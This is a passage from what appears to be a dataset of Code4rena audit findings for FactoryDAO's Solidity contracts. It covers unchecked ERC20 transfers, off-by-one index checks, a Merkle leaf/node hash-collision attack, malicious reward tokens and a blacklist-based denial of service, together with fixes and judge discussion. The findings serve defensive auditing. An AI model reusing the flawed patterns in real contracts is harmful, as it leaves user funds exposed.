      "content": "_Submitted by IllIllI_\n\nRebasing tokens are tokens that have each holder's `balanceof()` increase over time. Aave aTokens are an example of such tokens.\n\n### Impact\n\nUsers expect that when they deposit tokens to a pool, that they get back all rewards earned, not just a flat rate. With the contracts of this project, deposited tokens will grow in value, but the value in excess of the pre-calculated `getMaximumRewards()`/deposited amounts go solely to the owner/creator, or will remain locked in the contract\n\n### Proof of Concept\n\nIn the case of pools, the owner can withdraw the excess rebasing reward tokens by calling `withdrawExcessRewards()`, but is unable to withdraw excess deposited rebasing tokens. The Merkle-tree-related contracts have no way to withdraw any excess rebasing tokens.\n\nAll parts of the code assume that the value stated is the balance that is available to withdraw. It stores the values...\n\n*(Note: see [submission](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121) for full Proof of Concept)*\n\n### Recommended Mitigation Steps\n\nProvide a function for the pool owner to withdraw excess deposited tokens and repay any associated taxes. In the case of the Merkle trees though, pro rata share amounts need to be calculated and tracked and updated with every withdrawal, which will require drastic changes to the code, making it much more expensive.\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1122556516):**\n > Valid, but i think we will just not support rebasing tokens\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1145529476):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/3\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1154673476):**\n > Severity maintained.\n\n**[0xleastwood (warden) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1158625076):**\n > Not supporting rebasing tokens is equivalent to not supporting fee-on-transfer tokens. Maybe we could group all non-standard ERC20 issues together?\n\n**[IllIllI000 (warden) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1158643566):**\n > They are slightly different: Fee-on-transfer tokens cause things to revert which will either prevent the token from being used, or will cause deposited funds to be locked. With rebasing tokens, a user misses out on new rewards, rather than losing deposited capital\n\n**[ksk2345 (warden) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1160078975):**\n > If a sponsor mentions that they will not be supporting rebase tokens,  then its judged as invalid.<br>\n> Refer : https://github.com/code-423n4/2022-04-backed-findings/issues/105<br>\n> I think we need a general consensus in C4 org rulebook how to treat this token and having some consistent judgement.<br>\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/121#issuecomment-1163895257):**\n > The sponsor acknowledged the validity and referenced this in a PR so it's sitting somewhere between acknowledged and confirmed. In other words, the sponsor is not averse to lending a helping hand to rebase tokens but will not explicitly encourage the use of them. This is similar to how a standard CFMM allows for rebase tokens to exist and function but not without side effects, similar to the PR which does not close all holes against rebase tokens.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the code in the contracts of the project called 2022-05-factorydao, which is stored at the GitHub repository. The bug is related to the rebasing tokens, which are tokens that have each holder's `balanceof()` increase over time. The issue is that when users deposit tokens to a pool, they don't get back all rewards earned, only a flat rate. The contracts of this project don't provide a way to withdraw the excess rebasing tokens, and all parts of the code assume that the value stated is the balance that is available to withdraw.\n\nThe impact of this bug is that users cannot get back all rewards earned, and the excess rebasing tokens go solely to the owner/creator, or remain locked in the contract. The tools used for this bug report were code inspection.\n\nThe recommended mitigation steps for this bug are to provide a function for the pool owner to withdraw excess deposited tokens and repay any associated taxes. In the case of the Merkle trees, pro rata share amounts need to be calculated and tracked and updated with every withdrawal, which will require drastic changes to the code, making it much more expensive.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/121",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "2251",
      "title": "[M-08] A transfer that is not validated its result.",
      "impact": "MEDIUM",
      "content": "_Submitted by fatherOfBlocks_\n\nWhen the transfer is made in the **withdraw()** function, it is not validated if the transfer was done correctly.\n\nThis could be a conflict since not being able to perform it would return a false and that case would not be handled, the most common is to revert.\n\n### Recommended Mitigation Steps\n\nThe recommendation is to wrap the transfer with a require, as is done in **MerkleDropFactory.sol** for example.\n\n\n**[illuzen (FactoryDAO) acknowledged and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/87#issuecomment-1122093825):**\n > Malicious or otherwise bad tokens are considered acceptable risks for this contract as long as they cannot interfere with other trees.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/87#issuecomment-1145529354):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/3\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the MerkleVesting.sol code file on line 173. When the transfer is made in the withdraw() function, it is not validated if the transfer was done correctly. This could cause a conflict since not being able to perform it would return a false and that case would not be handled, the most common is to revert. The recommended mitigation step is to wrap the transfer with a require, as is done in MerkleDropFactory.sol for example. This would ensure that the transfer is performed correctly and that any errors are handled properly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/87",
      "tags": [],
      "finders": [
        "fatherOfBlocks"
      ]
    },
    {
      "id": "2250",
      "title": "[M-07] getRewards() in PermissionlessBasicPoolFactory calculate wrong reward amount for receiptId==0",
      "impact": "MEDIUM",
      "content": "_Submitted by unforgiven_\n\nIn `getRewards()` of `PermissionlessBasicPoolFactory` contract, there is a check to see that receipt is initialized receipt, but the condition used by code will be true for `receiptId` equal `0`. because `receiptId==0` is not initilized for any pool and the value of `pools[poolId].receipts[0].id` will be `0` so the condition `receipt.id == receiptId` will be passed on `getRewards()`. Any function that depends on `getRewards()` to check that if `receptId` has deposited fund, can be fooled. right now this bug has no direct money loss, but this function doesn't work as it suppose too.\n\n### Proof of Concept\n\nThis is `getRewards()` code:\n\n        function getRewards(uint poolId, uint receiptId) public view returns (uint[] memory) {\n            Pool storage pool = pools[poolId];\n            Receipt memory receipt = pool.receipts[receiptId];\n            require(pool.id == poolId, 'Uninitialized pool');\n            require(receipt.id == receiptId, 'Uninitialized receipt');\n            uint nowish = block.timestamp;\n            if (nowish > pool.endTime) {\n                nowish = pool.endTime;\n            }\n\n            uint secondsDiff = nowish - receipt.timeDeposited;\n            uint[] memory rewardsLocal = new uint[](pool.rewardsWeiPerSecondPerToken.length);\n            for (uint i = 0; i < pool.rewardsWeiPerSecondPerToken.length; i++) {\n                rewardsLocal[i] = (secondsDiff * pool.rewardsWeiPerSecondPerToken[i] * receipt.amountDepositedWei) / 1e18;\n            }\n            return rewardsLocal;\n        }\n\nif the value of `receiptId` set as `0` then even so `receiptId==0` is not initialized but this line:\n\n            require(receipt.id == receiptId, 'Uninitialized receipt');\n\nwill be passed, because, receipts start from number `1` and `pool.receipts[0]` will have zero value for his fields. This is the code in `deposit()` which is responsible for creating receipt objects.\n\n            pool.totalDepositsWei += amount;\n            pool.numReceipts++;\n\n            Receipt storage receipt = pool.receipts[pool.numReceipts];\n            receipt.id = pool.numReceipts;\n            receipt.amountDepositedWei = amount;\n            receipt.timeDeposited = block.timestamp;\n            receipt.owner = msg.sender;\n\nas you can see `pool.numReceipts++` and `pool.receipts[pool.numReceipts]` increase `numReceipts` and use it as receipts index. so receipnts will start from index `1`.<br>\nThis bug will cause that `getRewards(poolId, 0)` return `0` instead of reverting. any function that depend on reverting of `getRewards()` for uninitialized receipts can be excploited by sending `receipntId` as `0`. this function can be inside this contract or other contracts. (`withdraw` use `getRewards` and we will see that we can create `WithdrawalOccurred` event for `receiptsId` as 0)\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nIf you want to start from index `1` then add this line too to ensure `receipntId` is not `0` too:\n\n    require(receiptId > 0, 'Uninitialized receipt');\n\nor we could check for uninitialized receipnts with `owner` field as non-zero.\n\n**[illuzen (FactoryDAO) confirmed, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/161#issuecomment-1123873019):**\n > Technically valid, but it is a no-op, nothing bad happens either on withdraw or on getRewards. There are no functions that depend on getRewards reverting, but yes it would be cleaner if we do not allow 0 here.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the `getRewards()` function of the `PermissionlessBasicPoolFactory` contract. The code contained a check to see that the receipt was initialized, but the condition used by the code would be true for `receiptId` equal to `0`. This is because `receiptId==0` is not initialized for any pool and the value of `pools[poolId].receipts[0].id` will be `0`. Therefore, the condition `receipt.id == receiptId` will be passed on `getRewards()`. Any function that depends on `getRewards()` to check if `receiptId` has deposited funds, can be fooled. This bug has no direct money loss, but the function does not work as it should.\n\nThe bug is caused by the code in the `deposit()` function, which is responsible for creating receipt objects. This code increases `pool.numReceipts` and uses it as the receipt index, so the receipts start from index `1`. This means that `getRewards(poolId, 0)` will return `0` instead of reverting, which can be exploited by sending `receiptId` as `0`.\n\nThe recommended mitigation steps are to add a line to ensure `receiptId` is not `0`, or to check for uninitialized receipts with `owner` field as non-zero.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/161",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "2249",
      "title": "[M-06] wrong out of range check",
      "impact": "MEDIUM",
      "content": "_Submitted by danb_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L124>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol#L98>\n\n### Vulnerability details\n\n    require(merkleIndex <= numTrees, 'merkleIndex out of range');\n\nThis line checks that the index is valid.<br>\nHowever, the trees start at index 1, therefore index 0 should fail this check, but it doesn't.\n\n### Recommended Mitigation Steps\n\nchange to:\n\n    require(merkleIndex <= numTrees && merkleIndex > 0, 'merkleIndex out of range');\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/79#issuecomment-1122060088):**\n > Technically valid, but the next line will revert, unless you think someone has the keccak pre-image of zero bytes and this pre-image is a set of valid arguments to this function...\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/79#issuecomment-1145528891):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/4\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the MerkleIdentity.sol contract. The code in question can be found on lines 124 and 98 of the Github repository at https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleIdentity.sol. The code in question is a check to make sure that the index is valid. The trees start at index 1, so index 0 should fail this check, but it does not. The recommended mitigation step is to change the code to require that the index is both less than or equal to the number of trees and greater than 0.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/79",
      "tags": [],
      "finders": [
        "danb"
      ]
    },
    {
      "id": "2248",
      "title": "[M-05] MerkleDropFactory.depositTokens()  does not require the tree to exist",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L68-L79\n\n\n## Vulnerability details\n\n## Impact\n\nThe function `depositTokens()` does not first check to ensure that the `treeIndex` exists.\n\nThe impact is that we will attempt to transfer from the zero address to this address. If the transfer succeeds (which it currently does not since we use `IERC20.transferFrom()`)  then the `tokenBalance` of this index will be increased.\n\nThis will be an issue if the contract is updated to use OpenZeppelin's `safeTransferFrom()` function. This update may be necessary to support non-standard ERC20 tokens such as USDT.\n\nIf the update is made then `merkleTree.tokenAddress.safeTransferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");` will succeed if `merkleTree.tokenAddress = address(0)` since `safeTransferFrom()` succeeds against the zero address.\n\n## Proof of Concept\n\nThere are no checks the `treeIndex` is  valid.\n```solidity\n    function depositTokens(uint treeIndex, uint value) public {\n        // storage since we are editing\n        MerkleTree storage merkleTree = merkleTrees[treeIndex];\n\n\n        // bookkeeping to make sure trees don't share tokens\n        merkleTree.tokenBalance += value;\n\n\n        // transfer tokens, if this is a malicious token, then this whole tree is malicious\n        // but it does not effect the other trees\n        require(IERC20(merkleTree.tokenAddress).transferFrom(msg.sender, address(this), value), \"ERC20 transfer failed\");\n        emit TokensDeposited(treeIndex, merkleTree.tokenAddress, value);\n    }\n```\n\n## Recommended Mitigation Steps\n\nConsider adding the check to ensure `0 < treeIndex <= numTrees` in `depositTokens()`.",
      "summary": "\nThis bug report is about the function `depositTokens()` in the MerkleDropFactory.sol file, which does not check to see if the `treeIndex` exists. This means that if the contract is updated to use OpenZeppelin's `safeTransferFrom()` function, then a successful transfer from the zero address to this address could occur, resulting in an increase of the `tokenBalance` of this index. To prevent this, the check to ensure `0 < treeIndex <= numTrees` should be added to `depositTokens()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/59",
      "tags": [],
      "finders": [
        "AuditsAreUS"
      ]
    },
    {
      "id": "2247",
      "title": "[M-04] Merkle leaves are the same length as the parents that are hashed",
      "impact": "MEDIUM",
      "content": "_Submitted by AuditsAreUS_\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleLib.sol#L36-L42>\n\n<https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L94>\n\n### Impact\n\nThe size of a `leaf` is the same size of the parent data that is hashed, both are 64 bytes. As a result it is possible to have a hash collision between a leaf and any node in the tree. This allows for proofs to be repeated multiple times by taking subtrees as leaves.\n\nFraudulent proofs will disrupt the airdrop and transfer funds to invalid addresses.\n\n### Proof of Concept\n\nFor example consider the following binary tree which has 4 leaves d,e,f,g\n\na->b<br>\na->c<br>\n\nb->d<br>\nb->e<br>\n\nc->f<br>\nc->g<br>\n\nTo calculate the parent hash for c it is `keccak(f || g)` and the parent hash for a is `keccak(b || c)` as seen in the `parentHash()` function below.\n\n```solidity\n    function parentHash(bytes32 a, bytes32 b) public pure returns (bytes32) {\n        if (a < b) {\n            return keccak256(abi.encode(a, b));\n        } else {\n            return keccak256(abi.encode(b, a));\n        }\n    }\n```\n\nA leaf is calculated as\n\n```solidity\nbytes32 leaf = keccak256(abi.encode(destination, value));\n```\n\n`abi.encode(address,uint)` will output 64 bytes. Since `abi.encode(bytes32,bytes32)` will also be 64 bytes it is possible to have a hash collision between a leaf and a parent node.\n\nTaking the example above if we now set `destination = keccak(e || d)` and `value = keccak(f || g)` and provide the proof as an empty array since we are already at `a`, the root `[]`. This proof will verify for `destination` and `value` set to the hash of each child node.\n\nThis issue is rated as medium as there are some drawbacks to the attack that will make it challenging to pull off in practice. The first is that `destination` is a 20 bytes address and thus will require the node in the tree to have 12 leading zero bytes which may not occur. Second is the `value` is transferred to the user and so it is likely that the balance of the contract will not be sufficient for this transfer to succeed.\n\n### Recommended Mitigation Steps\n\nConsider using `leaf = keccak(abi.encodePacked(destination, value))` in `withdraw()` as this will reduce the size of the leaf data being hashed to 52 bytes.\n\nSince `keccak256` prevents length extension attacks a different length of data to be hashed can be assumed to give different hashes and prevent a collision between a leaf and other nodes in the tree.\n\n**[illuzen (FactoryDAO) acknowledged and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/58#issuecomment-1122034825):**\n > Valid. Interesting attack, but even if it is successful, it will transfer tokens to what is almost certainly an unusable address, making this both very unlikely (due to issues you mentioned) and of zero benefit to the attacker (griefing). 12 sequential zero bytes would occur approximately 1 out of every 16^12 = 281474976710656 nodes.\n> \n> I recommend bonus points for this one.\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/58#issuecomment-1154660758):**\n > Very impressive analysis.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that can disrupt the airdrop and transfer funds to invalid addresses. The vulnerability is caused by the size of a leaf being the same size as the parent data that is hashed. This allows for proofs to be repeated multiple times by taking subtrees as leaves. To demonstrate this, a binary tree with four leaves (d,e,f,g) is used as an example. The parent hash for c is calculated as `keccak(f || g)` and the parent hash for a is `keccak(b || c)`. A leaf is calculated as `bytes32 leaf = keccak256(abi.encode(destination, value))`. Since `abi.encode(bytes32,bytes32)` will also be 64 bytes it is possible to have a hash collision between a leaf and a parent node. With this vulnerability, a proof can be verified for `destination` and `value` set to the hash of each child node. \n\nThis issue is rated as medium as there are some drawbacks to the attack that will make it challenging to pull off in practice. The first is that `destination` is a 20 bytes address and thus will require the node in the tree to have 12 leading zero bytes which may not occur. Second is the `value` is transferred to the user and so it is likely that the balance of the contract will not be sufficient for this transfer to succeed.\n\nThe recommended mitigation steps for this vulnerability is to use `leaf = keccak(abi.encodePacked(destination, value))` in `withdraw()` as this will reduce the size of the leaf data being hashed to 52 bytes. Since `keccak256` prevents length extension attacks, a different length of data to be hashed can be assumed to give different hashes and prevent a collision between a leaf and other nodes in the tree.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/58",
      "tags": [],
      "finders": [
        "AuditsAreUS"
      ]
    },
    {
      "id": "2246",
      "title": "[M-03] safeTransferFrom is recommended instead of transfer (1)",
      "impact": "MEDIUM",
      "content": "_Submitted by MaratCerby, also found by berndartmueller, broccolirob, CertoraInc, cryptphi, danb, gzeon, horsefacts, hyh, joestakey, leastwood, throttle, VAD37, wuwe1, and z3s_\n\nERC20 standard allows transferF function of some contracts to return bool or return nothing.<br>\nSome tokens such as USDT return nothing.<br>\nThis could lead to funds stuck in the contract without possibility to retrieve them.<br>\nUsing safeTransferFrom of SafeERC20.sol is recommended instead.<br>\n\n### Proof of Concept\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/token/ERC20/utils/SafeERC20.sol>\n\n**[illuzen (FactoryDAO) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/22#issuecomment-1121974704):**\n > We support ERC20 contracts, not SafeERC20. Contracts that do not conform to the standard are not supported.\n\n**[illuzen (FactoryDAO) confirmed and resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/22#issuecomment-1145530282):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ERC20 standard, which allows transferF functions of some contracts to return either bool or nothing. This could lead to funds stuck in the contract without the possibility to retrieve them. A proof of concept is provided in the report.\n\nThe recommended mitigation step is to use the safeTransferFrom of SafeERC20.sol instead. This is a contract from the OpenZeppelin library which provides a secure way to transfer tokens. This library is available on Github and can be used to replace the vulnerable transferF function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/22",
      "tags": [
        "transferFrom vs safeTransferFrom"
      ],
      "finders": [
        "danb",
        "VAD37",
        "wuwe1",
        "CertoraInc",
        "MaratCerby",
        "leastwood",
        "joestakey",
        "throttle",
        "gzeon",
        "berndartmueller",
        "broccolirob",
        "z3s",
        "cryptphi",
        "hyh",
        "horsefacts"
      ]
    },
    {
      "id": "2245",
      "title": "[M-02] Malicious token reward could disable withdrawals",
      "impact": "MEDIUM",
      "content": "_Submitted by shenwilly, also found by 0xYamiDancho, hickuphh3, hubble, kenzo, and leastwood_\n\n`PermissionlessBasicPoolFactory.withdraw` requires each reward token transfers to succeed before withdrawing the deposit. If one of the reward token is a malicious/pausable contract that reverts on transfer, unaware users that deposited into this pool will have their funds stuck in the contract.\n\n### Recommended Mitigation Steps\n\nAdd an `emergencyWithdraw` function that ignores failed reward token transfers.\n\n\n**[illuzen (FactoryDAO) confirmed and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/20#issuecomment-1121973616):**\n > This is explicitly acknowledged in the contract comments, malicious reward tokens render the pool malicious, there is no way to get around that, but the emergencyWithdraw idea is good\n\n**[illuzen (FactoryDAO) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/20#issuecomment-1123225361):**\n > Technically duplicate, but mitigation is better here.\n\n**[illuzen (FactoryDAO) resolved](https://github.com/code-423n4/2022-05-factorydao-findings/issues/20#issuecomment-1145529907):**\n > https://github.com/code-423n4/2022-05-factorydao/pull/2\n\n**[ksk2345  (warden) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/20#issuecomment-1160012500):**\n > 1. User Funds are at loss so severity of this issue is High. Please check the descriptions in the duplicate  IssueIDs : #191, #145, and #106 (marked wrongly as dup of M13)\n> 2. IssueId #192 and #246 are wrongly marked as dup of M02. The root cause is malicious rewardToken, but the impact is different than that of M02, and also the code fix for the impact will be different. M02 talks of impact on loss of user deposits and the fix will be in withdraw function. While these two Issues impact on globalBeneficiary not able to withdraw rewards, the fix will be in withdrawTaxes() function. Hence, these two issues needs to be separated into a New Medium Issue.\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/20#issuecomment-1163884936):**\n > @ksk2345 - I really do sympathize with your point of view. I think you made two good points.\n> Here's the thing, though: When assessing these issues, it's very important to take sponsor's intent into account. That's what makes humans necessary in C4 (for now). Sufficiently powerful software can form a graph of vulnerabilities and draw inferences. Our job is to figure out if these vulnerabilities matter and to what extent.\n> \n> First to the broader point of linking duplicates, whether blocking users or taxes, the vector is via a malicious pool creator in the form of a reward token. The reason this matters is because the Factorydao pools can be permissionlessly created and completely ignored by users. They are analogous to Uniswap pools. Sure, someone could create a malicious token pair in Uniswap but since all pairs are opt-in and can be routed around, the use of this pair requires explicit consent from the end user.\n> \n> If we bear in mind that end user involvement is consensual and that this is communicated to the users and that nothing can be hidden on Ethereum then it follows that we can umbrella these issues not as malicious tokens or withdrawal and tax vulnerabilities but pool creators trying to game the code while relying on social engineering to funnel unsuspecting users through these channels (scam).\n> \n> **digression on duplicates**<br>\n> On a broader issue of duplicates, I notice a similar theme arising when duplicate labels are challenged so I'd just like to clarify how I grouped duplicates:\n> \n> For most of the duplicate disputes, it was \"the issue reported the same but the fix was different.\" If the issue is invalid, however, then the fix is kind of irrelevant which is why I grouped those all as the same issue. If the issue is the same but the fixes different, then I grouped them if the fixes were qualitatively similar. If there was one amongst them that provided the best fix, this would be the original in the set. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PermissionlessBasicPoolFactory contract. This vulnerability allows malicious/pausable contracts to prevent users from withdrawing their deposits. The impact of this vulnerability is that unaware users will have their funds stuck in the contract. The recommended mitigation step to fix this vulnerability is to add an emergencyWithdraw function that ignores failed reward token transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/20",
      "tags": [],
      "finders": [
        "0xYamiDancho",
        "hickuphh3",
        "leastwood",
        "shenwilly",
        "hubble",
        "kenzo"
      ]
    },
    {
      "id": "2244",
      "title": "[M-01] SpeedBumpPriceGate.sol#addGate() Lack of input validation may casue div by 0 error",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L43\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L43\n\n```solidity\n    gate.priceIncreaseDenominator = priceIncreaseDenominator;\n```\n\nIf `priceIncreaseDenominator` is set to `0` when `addGate()`, in `passThruGate()` the tx will revert at L72 because of div by 0.\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L71-L72\n\n```solidity\n    // multiply by the price increase factor\n    gate.lastPrice = (price * gate.priceIncreaseFactor) / gate.priceIncreaseDenominator;\n```\n\n### Recommendation\n\nConsider adding a check in `addGate()` to require `priceIncreaseDenominator > 0`.",
      "summary": "\nThis bug report concerns a vulnerability in the code of a smart contract called SpeedBumpPriceGate.sol. This vulnerability allows an attacker to set a variable (priceIncreaseDenominator) to 0 when calling the addGate() function. This can cause the tx to revert at line 72 of the code, as it attempts to divide by 0. The recommendation is to add a check in the addGate() function to require that priceIncreaseDenominator is greater than 0. This will help to prevent the tx from reverting and protect the smart contract from attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/153",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "2243",
      "title": "[H-03] MerkleVesting withdrawal does not verify that tokens were transferred successfully",
      "impact": "HIGH",
      "content": "_Submitted by kenzo, also found by IllIllI_\n\nAcross the codebase, the protocol is usually checking that ERC20 transfers have succeeded by checking their return value.\nThis check is missing in MerkleVesting's `withdraw` function.\n\n### Impact\n\nIf for some reason the ERC20 transfer is temporarily failing, the user would totally lose his allocation and funds.\nAll the state variables would already have been updated at this stage, so he can't call `withdraw` again.\nThere is no way to withdraw these locked tokens.\n\n### Proof of Concept\n\nAt the last point of `withdraw`, the function [is sending](https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleVesting.sol#L173) the funds to the user, and does not check the return value - whether it has succeeded:\n\n            IERC20(tree.tokenAddress).transfer(destination, currentWithdrawal);\n\nNote that this is (nicely and rightfully) done after all the state variables have been updated.\nAs the return value of the external call is not checked, if it has failed, the contract wouldn't know about it, and the function will finish \"successfully\".\n\n### Recommended Mitigation Steps\n\nAs done throughout the rest of the protocol, add a check that verifies that the transfer has succeeded.\n\n\n**[illuzen (FactoryDAO) acknowledged, disagreed with severity and commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/130#issuecomment-1122570209):**\n > Debatable, since requiring successful transfer means we can't do non-standard tokens like USDT. Also, tokens could be malicious and simply lie about the success.\n\n**[Justin Goro (judge) commented](https://github.com/code-423n4/2022-05-factorydao-findings/issues/130#issuecomment-1155855225):**\n > Regarding the non standard tokens that don't return bools, the common approach to performing a low level call with \n> ```\n> (bool success, _)  = address(token).call(//etc\n> ```\n> allows for transfers to be validated for USDT.\n> \n> Severity will stand because this function represents user funds.\n> \n\n\n\n***\n\n \n",
      "summary": "\nThe codebase of the protocol is missing a check that verifies that an ERC20 transfer has succeeded in the MerkleVesting's `withdraw` function. This could lead to users losing their allocation and funds if the ERC20 transfer fails for any reason. The function is sending the funds to the user without checking the return value, so if the transfer fails, the contract won't know and the function will finish \"successfully\". To mitigate this vulnerability, it is recommended to add a check that verifies that the transfer has succeeded, as done throughout the rest of the protocol.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "FactoryDAO",
      "source_link": "https://code4rena.com/reports/2022-05-factorydao",
      "github_link": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/130",
      "tags": [],
      "finders": [
        "IllIllI",
        "kenzo"
      ]
    },
    {
      "id": "2242",
      "title": "[H-02] DoS: Blacklisted user may prevent withdrawExcessRewards()",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L242-L256\nhttps://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L224-L234\n\n\n## Vulnerability details\n\n## Impact\n\nIf one user becomes blacklisted or otherwise cannot be transferred funds in any of the rewards tokens or the deposit token then they will not be able to call `withdraw()` for that token.\n\nThe impact of one user not being able to call `withdraw()` is that the owner will now never be able to call `withdrawExcessRewards()` and therefore lock not only the users rewards and deposit but also and excess rewards attributed to the owner.\n\nThus, one malicious user may deliberately get them selves blacklisted to prevent the owner from claiming the final rewards. Since the attacker may do this with negligible balance in their `deposit()` this attack is very cheap.\n\n## Proof of Concept\n\nIt is possible for `IERC20(pool.rewardTokens[i]).transfer(receipt.owner, transferAmount);` to fail for numerous reasons. Such as if a user has been blacklisted (in certain ERC20 tokens) or if a token is paused or there is an attack and the token is stuck.\n\nThis will prevent `withdraw()` from being called.\n\n```solidity\n        for (uint i = 0; i < rewards.length; i++) {\n            pool.rewardsWeiClaimed[i] += rewards[i];\n            pool.rewardFunding[i] -= rewards[i];\n            uint tax = (pool.taxPerCapita * rewards[i]) / 1000;\n            uint transferAmount = rewards[i] - tax;\n            taxes[poolId][i] += tax;\n            success = success && 